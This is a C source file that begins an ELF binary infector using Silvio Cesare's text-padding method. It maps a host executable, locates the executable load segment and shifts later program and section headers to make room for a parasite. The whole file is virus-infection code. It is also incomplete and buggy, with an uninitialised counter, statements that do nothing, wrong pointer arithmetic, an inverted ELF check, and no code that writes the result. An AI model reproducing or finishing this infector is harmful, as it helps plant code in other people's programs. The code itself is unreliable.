/* Inject an ELF by using Silvio's Cesare text appending
 * and padding method */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

#define PAGE_SIZE 4096
#define TMP "tmp.bin"

int hfd, pfd;
int patch_position;
struct stat hst, pst;

void infect_elf();

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        printf("usage: %s <host> <parasite> <patch-position>\n", argv[0]);
        exit(1);
    }

    patch_position = atoi(argv[3]);

    if ((hfd = open(argv[1], O_RDONLY)) == -1) 
    {
        perror("host open");
        exit(-1);
    }

    if ((pfd = open(argv[2], O_RDONLY)) == -1)
    {
        perror("parasite open");
        exit(-1);
    }

    if (fstat(hfd, &hst))
    {
        perror("host stat");
        exit(-1);
    }
     
    if (fstat(pfd, &pst))
    {
        perror("parasite stat");
        exit(-1);
    }

    infect_elf();
}

void infect_elf()
{
    
    unsigned long entry_point, text_offset;
    unsigned char *mem;
    unsigned int entry_offset;
    int psize;
    Elf32_Ehdr *e_hdr;
    Elf32_Phdr *p_hdr;
    Elf32_Shdr *s_hdr;
    int i;

    psize = pst.st_size;

    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }

    e_hdr = (Elf32_Ehdr *) mem;

    if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    int text_found;
    p_hdr = (Elf32_Phdr *) mem + e_hdr->e_phoff;

    // iterate over phdrs looking for the text segment
    for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
    {
        if (text_found)
        {
            // while (psize > PAGE_SIZE) {
            p_hdr->p_offset += PAGE_SIZE;
            p_hdr->p_vaddr += PAGE_SIZE;
            // psize -= PAGE_SIZE
        }

        if (p_hdr->p_type == PT_LOAD)
            if (p_hdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = p_hdr->p_offset;
                entry_offset = p_hdr->p_filesz;
                p_hdr->p_filesz + psize;
                p_hdr->p_memsz + psize;
            }
    }

    // will the section header table have to be pushed?
    s_hdr = (Elf32_Shdr *) mem + e_hdr->e_shoff;
    for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
    {
        if (s_hdr->sh_offset > text_offset)
            s_hdr->sh_offset += PAGE_SIZE;
    }
        
}

